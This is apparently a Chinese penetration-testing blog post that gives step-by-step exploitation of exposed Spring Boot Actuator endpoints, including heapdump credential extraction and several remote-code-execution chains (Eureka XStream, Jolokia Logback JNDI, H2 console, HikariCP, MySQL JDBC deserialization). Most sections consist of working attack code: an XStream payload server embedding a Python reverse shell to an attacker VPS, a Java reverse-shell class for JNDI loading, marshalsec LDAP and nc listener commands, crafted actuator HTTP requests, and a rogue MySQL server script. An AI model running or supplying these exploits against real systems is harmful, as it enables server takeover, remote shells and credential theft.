<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>Springboot利用 | Hurn's Blog</title><meta name="description" content="Springboot利用 - Hurn"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hurn's Blog"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="Hurn's Blog"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/Dreyer" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Springboot利用</h1><div class="post-info"><a></a>2022-07-05</div><div class="post-content"><h1 id="0x1-heapdump密码导出"><a href="#0x1-heapdump密码导出" class="headerlink" title="0x1. heapdump密码导出"></a>0x1. heapdump密码导出</h1><ul>
<li>heapdump ，快照导出</li>
</ul>
<blockquote>
<p>需要能访问到 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口 </p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit#0x06restart-h2-database-query-rce:~:text=Eclipse%20Memory%20Analyzer">工具下载链接</a> ，使用以下语句进行搜索：</p>
<pre><code class="SQL"># 搜索password等关键字
select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))
# 或
select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))
</code></pre>
<p><a target="_blank" rel="noopener" href="https://github.com/whwlsfb/JDumpSpider">工具2</a> ，推荐</p>
<h1 id="0x2-Eureka-Xstream-Deserialization-RCE"><a href="#0x2-Eureka-Xstream-Deserialization-RCE" class="headerlink" title="0x2. Eureka Xstream Deserialization RCE"></a>0x2. Eureka Xstream Deserialization RCE</h1><p>利用条件：</p>
<ul>
<li><p>POST访问 /env 、/refresh接口设置、刷新</p>
</li>
<li><p>存在Eureke-client &lt; 1.8.7</p>
<blockquote>
<p>在env中可以搜 netflix 判断是否存在依赖 </p>
<p>com.netflix.servo.DefaultMonitorRegistry.registryClass    “com.netflix.servo.BasicMonitorRegistry”</p>
</blockquote>
<p>eureka-client 自带xstream依赖</p>
<img src="/2022/07/05/Java/Springboot%E5%88%A9%E7%94%A8/image-20220721103215469.png" alt="image-20220721103215469" style="zoom:25%;"></li>
</ul>
<p>利用：</p>
<ol>
<li>搭建xstream payload 网站 和 反弹shell ，如果是Windows 可以直接下载exe上线</li>
</ol>
<p>注意这个xml序列化执行的命令是Linux下的：</p>
<pre><code class="python">from flask import Flask, Response

app = Flask(__name__)


@app.route(&#39;/&#39;, defaults=&#123;&#39;path&#39;: &#39;&#39;&#125;)
@app.route(&#39;/&lt;path:path&gt;&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def catch_all(path):
    xml = &quot;&quot;&quot;&lt;linked-hash-set&gt;
  &lt;jdk.nashorn.internal.objects.NativeString&gt;
    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
      &lt;dataHandler&gt;
        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
                    &lt;command&gt;
                       &lt;string&gt;/bin/bash&lt;/string&gt;
                       &lt;string&gt;-c&lt;/string&gt;
                       &lt;string&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-vps-ip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;&lt;/string&gt;
                    &lt;/command&gt;
                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
                  &lt;/next&gt;
                &lt;/iter&gt;
                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
                  &lt;method&gt;
                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
                    &lt;name&gt;start&lt;/name&gt;
                    &lt;parameter-types/&gt;
                  &lt;/method&gt;
                  &lt;name&gt;foo&lt;/name&gt;
                &lt;/filter&gt;
                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
              &lt;/serviceIterator&gt;
              &lt;lock/&gt;
            &lt;/cipher&gt;
            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
            &lt;ibuffer&gt;&lt;/ibuffer&gt;
          &lt;/is&gt;
        &lt;/dataSource&gt;
      &lt;/dataHandler&gt;
    &lt;/value&gt;
  &lt;/jdk.nashorn.internal.objects.NativeString&gt;
&lt;/linked-hash-set&gt;&quot;&quot;&quot;
    return Response(xml, mimetype=&#39;application/xml&#39;)


if __name__ == &quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;, port=80)
</code></pre>
<p>接受反弹shell</p>
<pre><code class="shell">root@ubuntu:~# nc -nlp 6666
</code></pre>
<p>如果是Windows 无法反弹，可以测试DNSLOG，上线CS</p>
<pre><code class="xml">&lt;command&gt;
    &lt;string&gt;cmd.exe&lt;/string&gt;
    &lt;string&gt;/c&lt;/string&gt;
    &lt;string&gt;ping -n 1 29quaf.dnslog.cn&lt;/string&gt;
&lt;/command&gt;
</code></pre>
<ol start="2">
<li>更改eureka属性去请求payload</li>
</ol>
<p>spring 1.x</p>
<pre><code>POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
</code></pre>
<p>spring 2.x</p>
<pre><code>POST /actuator/env
Content-Type: application/json

&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;&#125;
</code></pre>
<ol start="3">
<li>刷新配置让属性生效</li>
</ol>
<p>spring 1.x</p>
<pre><code>POST /refresh
Content-Type: application/x-www-form-urlencoded
</code></pre>
<p>spring 2.x</p>
<pre><code>POST /actuator/refresh
Content-Type: application/json
</code></pre>
<ol start="4">
<li>检查配置是否生效</li>
</ol>
<p>访问/env，搜索变量<code>eureka.client.serviceUrl.defaultZone</code> 查看是否设置生效</p>
<p><img src="/2022/07/05/Java/Springboot%E5%88%A9%E7%94%A8/image-20220721083549618.png" alt="image-20220721083549618"></p>
<ol start="5">
<li>Windows环境，收到DNSLOG</li>
</ol>
<img src="/2022/07/05/Java/Springboot%E5%88%A9%E7%94%A8/image-20220721102855318.png" alt="image-20220721102855318" style="zoom:25%;">



<h1 id="0x3-Jolokia-Logback-JNDI-RCE"><a href="#0x3-Jolokia-Logback-JNDI-RCE" class="headerlink" title="0x3. Jolokia Logback JNDI RCE"></a>0x3. Jolokia Logback JNDI RCE</h1><p>Jolokia<a target="_blank" rel="noopener" href="https://docs.spring.io/spring-boot/docs/2.1.1.RELEASE/reference/html/production-ready-jmx.html">官方</a>给的解释为JMX的web管理工具，用来管理JMX bean:</p>
<blockquote>
<p>Jolokia is a JMX-HTTP bridge that provides an alternative method of accessing JMX beans. To use Jolokia, include a dependency to <code>org.jolokia:jolokia-core</code>. For example, with Maven, you would add the following dependency:</p>
</blockquote>
<p>当环境中的Logback配置文件可控时，即可触发JNDI，而jolokia正好可以控制、设置这个属性</p>
<p>利用前提：</p>
<ul>
<li>jdk环境满足jndi</li>
<li>存在合适的MBeans</li>
</ul>
<blockquote>
<p>访问 <strong>/jolokia/list</strong> 接口，查看是否存在 <strong>ch.qos.logback.classic.jmx.JMXConfigurator</strong> 和 <strong>reloadByURL</strong> 关键词。</p>
</blockquote>
<p><strong>利用：</strong></p>
<blockquote>
<p>主要思路，通过jolokia设置logback的配置文件为远端xml，加载jndi</p>
</blockquote>
<ol>
<li>配置用来JNDI注入的logback配置文件：</li>
</ol>
<pre><code class="xml">&lt;configuration&gt;
  &lt;insertFromJNDI env-entry-name=&quot;ldap://your-vps-ip:1389/JNDIObject&quot; as=&quot;appName&quot; /&gt;
&lt;/configuration&gt;
</code></pre>
<ol start="2">
<li>配置JNDI LDAP环境：</li>
</ol>
<p>编译低版本的class</p>
<pre><code class="shell">root@ubuntu:~# javac -source 1.5 -target 1.5 JNDIObject.java
</code></pre>
<pre><code class="java">// JNDIObject.java
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class JNDIObject &#123;
    static &#123;
        try&#123;
            String ip = &quot;your-vps-ip&quot;;
            String port = &quot;443&quot;;
            String py_path = null;
            String[] cmd;
            if (!System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;windows&quot;)) &#123;
                String[] py_envs = new String[]&#123;&quot;/bin/python&quot;, &quot;/bin/python3&quot;, &quot;/usr/bin/python&quot;, &quot;/usr/bin/python3&quot;, &quot;/usr/local/bin/python&quot;, &quot;/usr/local/bin/python3&quot;&#125;;
                for(int i = 0; i &lt; py_envs.length; ++i) &#123;
                    String py = py_envs[i];
                    if ((new File(py)).exists()) &#123;
                        py_path = py;
                        break;
                    &#125;
                &#125;
                if (py_path != null) &#123;
                    if ((new File(&quot;/bin/bash&quot;)).exists()) &#123;
                        // 注意下面这个转译，否则无法编译 
                        cmd = new String[]&#123;py_path, &quot;-c&quot;, &quot;import pty;pty.spawn(\&quot;/bin/bash\&quot;)&quot;&#125;;
                    &#125; else &#123;
                        // 注意下面这个转译，否则无法编译 
                        cmd = new String[]&#123;py_path, &quot;-c&quot;, &quot;import pty;pty.spawn(\&quot;/bin/sh\&quot;)&quot;&#125;;
                    &#125;
                &#125; else &#123;
                    if ((new File(&quot;/bin/bash&quot;)).exists()) &#123;
                        cmd = new String[]&#123;&quot;/bin/bash&quot;&#125;;
                    &#125; else &#123;
                        cmd = new String[]&#123;&quot;/bin/sh&quot;&#125;;
                    &#125;
                &#125;
            &#125; else &#123;
                cmd = new String[]&#123;&quot;cmd.exe&quot;&#125;;
            &#125;
            Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();
            Socket s = new Socket(ip, Integer.parseInt(port));
            InputStream pi = p.getInputStream();
            InputStream pe = p.getErrorStream();
            InputStream si = s.getInputStream();
            OutputStream po = p.getOutputStream();
            OutputStream so = s.getOutputStream();
            while(!s.isClosed()) &#123;
                while(pi.available() &gt; 0) &#123;
                    so.write(pi.read());
                &#125;
                while(pe.available() &gt; 0) &#123;
                    so.write(pe.read());
                &#125;
                while(si.available() &gt; 0) &#123;
                    po.write(si.read());
                &#125;
                so.flush();
                po.flush();
                Thread.sleep(50L);
                try &#123;
                    p.exitValue();
                    break;
                &#125; catch (Exception e) &#123;
                &#125;
            &#125;
            p.destroy();
            s.close();
        &#125;catch (Throwable e)&#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
</code></pre>
<p>开启LDAP Ref 重定向到JNDIObject.class</p>
<pre><code class="shell">root@ubuntu:~#java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
</code></pre>
<ol start="3">
<li>将logback的配置文件指定为远程的test.xml，这个配置文件会加载JNDI</li>
</ol>
<pre><code>/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-ip:your-port!/test.xml
</code></pre>
<ol start="4">
<li>接受弹回来的shell:</li>
</ol>
<pre><code class="shell"># JNDIObject.java 中的端口
nc -nlp your-port
</code></pre>
<p><img src="/2022/07/05/Java/Springboot%E5%88%A9%E7%94%A8/image-20220720194541878.png" alt="image-20220720194541878"></p>
<h1 id="0x4-H2-Database-Console-JNDI-RCE"><a href="#0x4-H2-Database-Console-JNDI-RCE" class="headerlink" title="0x4. H2 Database Console JNDI RCE"></a>0x4. H2 Database Console JNDI RCE</h1><p>利用前提：</p>
<ul>
<li>jdk满足jnddi</li>
<li>开起H2 Database Console</li>
</ul>
<img src="/2022/07/05/Java/Springboot%E5%88%A9%E7%94%A8/image-20220721143633481.png" alt="image-20220721143633481" style="zoom: 33%;">

<p>利用：</p>
<ol>
<li>配置JDNI环境： </li>
</ol>
<pre><code class="shell">root@ubuntu:~#java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
root@ubuntu:~# nc -nlp your-port
</code></pre>
<ol start="2">
<li>访问 <code>h2-console</code> 在JDBC URL处 ，进行JNDI注入</li>
</ol>
<img src="/2022/07/05/Java/Springboot%E5%88%A9%E7%94%A8/image-20220721143532447.png" alt="image-20220721143532447" style="zoom:20%;">

<ol start="3">
<li>反弹的shell:</li>
</ol>
<img src="/2022/07/05/Java/Springboot%E5%88%A9%E7%94%A8/image-20220721143951222.png" alt="image-20220721143951222" style="zoom:33%;">





<h1 id="0x5-HikariCP-H2-Database-Query-RCE"><a href="#0x5-HikariCP-H2-Database-Query-RCE" class="headerlink" title="0x5. HikariCP - H2 Database Query RCE"></a>0x5. HikariCP - H2 Database Query RCE</h1><p>Spring Boot 2.x默认使用的HikariCP数据库连接池提供了一个变量<code>spring.datasource.hikari.connection-test-query</code>，这个变量可以用来执行SQL语句，在H2环境中可以用来执行代码</p>
<p>利用前提：</p>
<ul>
<li>需要有H2数据库的依赖和HikariCP</li>
<li>可以重启actuator</li>
</ul>
<p>利用：</p>
<ol>
<li>设置环境变量</li>
</ol>
<pre><code class="http">POST /actuator/env HTTP/1.1

content-type: application/json

&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#39;; CALL EXEC(&#39;calc.exe&#39;);&quot;&#125;
</code></pre>
<ol start="2">
<li>重启</li>
</ol>
<pre><code class="http">POST /actuator/restart HTTP/1.1

content-type: application/json

&#123;&#125;
</code></pre>
<ol start="3">
<li>弹出计算器</li>
</ol>
<img src="/2022/07/05/Java/Springboot%E5%88%A9%E7%94%A8/image-20220721144722949.png" alt="image-20220721144722949" style="zoom:25%;">





<h1 id="0x6-MySQL-JDBC-DeserializationRCE"><a href="#0x6-MySQL-JDBC-DeserializationRCE" class="headerlink" title="0x6. MySQL JDBC DeserializationRCE"></a>0x6. MySQL JDBC DeserializationRCE</h1><p>未复现成功，没有回连mysql….</p>
<ol>
<li></li>
</ol>
<pre><code class="python">#!/usr/bin/env python
# coding: utf-8

import os
import socket
import binascii


def server_send(conn, payload):
    global count
    count += 1
    print(&quot;[*] Package order: &#123;&#125;, Send: &#123;&#125;&quot;.format(count, payload))
    conn.send(binascii.a2b_hex(payload))


def server_receive(conn):
    global count, BUFFER_SIZE

    count += 1
    data = conn.recv(BUFFER_SIZE)
    print(&quot;[*] Package order: &#123;&#125;, Receive: &#123;&#125;&quot;.format(count, data))
    return str(data).lower()


def run_mysql_server():
    global count, deserialization_payload

    while True:
        count = 0
        conn, addr = server_socks.accept()
        print(&quot;[+] Connection from client -&gt; &#123;&#125;:&#123;&#125;&quot;.format(addr[0], addr[1]))
        greeting = &#39;4a0000000a352e372e323900160000006c7a5d420d107a7700ffff080200ffc11500000000000000000000566d1a0a796d3e1338313747006d7973716c5f6e61746976655f70617373776f726400&#39;
        server_send(conn, greeting)
        if os.path.isfile(deserialization_file):
            with open(deserialization_file, &#39;rb&#39;) as _f:
                deserialization_payload = binascii.b2a_hex(_f.read())
        while True:
            # client auth
            server_receive(conn)
            server_send(conn, response_ok)

            # client query
            data = server_receive(conn)
            if &quot;session.auto_increment_increment&quot; in data:
                _payload = &#39;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c210009000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f90000150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013007343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e035554430653595354454d0f52455045415441424c452d5245414405323838303007000016fe000002000200&#39;
                server_send(conn, _payload)
                data = server_receive(conn)
            if &quot;show warnings&quot; in data:
                _payload = &#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#39;
                server_send(conn, _payload)
                data = server_receive(conn)
            if &quot;set names&quot; in data:
                server_send(conn, response_ok)
                data = server_receive(conn)
            if &quot;set character_set_results&quot; in data:
                server_send(conn, response_ok)
                data = server_receive(conn)
            if &quot;show session status&quot; in data:
                _data = &#39;0100000102&#39;
                _data += &#39;2700000203646566056365736869046f626a73046f626a730269640269640c3f000b000000030000000000&#39;
                _data += &#39;2900000303646566056365736869046f626a73046f626a73036f626a036f626a0c3f00ffff0000fc9000000000&#39;
                _payload_hex = str(hex(len(deserialization_payload)/2)).replace(&#39;0x&#39;, &#39;&#39;).zfill(4)
                _payload_length = _payload_hex[2:4] + _payload_hex[0:2]
                _data_hex = str(hex(len(deserialization_payload)/2 + 5)).replace(&#39;0x&#39;, &#39;&#39;).zfill(6)
                _data_lenght = _data_hex[4:6] + _data_hex[2:4] + _data_hex[0:2]
                _data += _data_lenght + &#39;04&#39; + &#39;0131fc&#39; + _payload_length + deserialization_payload
                _data += &#39;07000005fe000022000100&#39;
                server_send(conn, _data)
                data = server_receive(conn)
            if &quot;show warnings&quot; in data:
                _payload = &#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#39;
                server_send(conn, _payload)

            break
        try:
            conn.close()
        except Exception as e:
            pass


if __name__ == &quot;__main__&quot;:
    HOST = &quot;0.0.0.0&quot;
    PORT = 3306

    deserialization_file = r&#39;payload.ser&#39;
    if os.path.isfile(deserialization_file):
        with open(deserialization_file, &#39;rb&#39;) as f:
            deserialization_payload = binascii.b2a_hex(f.read())
    else:
        deserialization_payload = &#39;aced****(your deserialized hex data)&#39;

    count = 0
    BUFFER_SIZE = 1024
    response_ok = &#39;0700000200000002000000&#39;
    print(&quot;[+] rogue mysql server Listening on &#123;&#125;:&#123;&#125;&quot;.format(HOST, PORT))
    server_socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socks.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socks.bind((HOST, PORT))
    server_socks.listen(1)

    run_mysql_server()
</code></pre>
<p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p>
<pre><code>java -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser
</code></pre>
<ol start="2">
<li>设置mysql</li>
</ol>
<p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p>
<pre><code>jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true
</code></pre>
<p>mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p>
<pre><code>jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true
</code></pre>
<p>spring 1.x</p>
<pre><code>POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.url=对应属性值
</code></pre>
<p>spring 2.x</p>
<pre><code>POST /actuator/env
Content-Type: application/json

&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;
</code></pre>
<ol start="3">
<li>刷新配置</li>
</ol>
<p>spring 1.x</p>
<pre><code>POST /refresh
Content-Type: application/x-www-form-urlencoded
</code></pre>
<p>spring 2.x</p>
<pre><code>POST /actuator/refresh
Content-Type: application/json
</code></pre>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a target="_blank" rel="noopener" href="https://0xn3va.gitbook.io/cheat-sheets/framework/spring/routing-abuse">https://0xn3va.gitbook.io/cheat-sheets/framework/spring/routing-abuse</a></p>
<p><a target="_blank" rel="noopener" href="https://www.hacking8.com/bug-product/Spring-Boot/Spring-Boot-Actuator-jolokia-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84rce%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-product/Spring-Boot/Spring-Boot-Actuator-jolokia-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84rce%E6%BC%8F%E6%B4%9E.html</a></p>
</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/08/20/%E5%A6%82%E4%BD%95%E6%B7%B7%E4%B8%80%E4%B8%AAC2/">prev</a><a class="next" href="/2022/07/03/Go%E5%B9%B6%E5%8F%91/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">Hurn</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>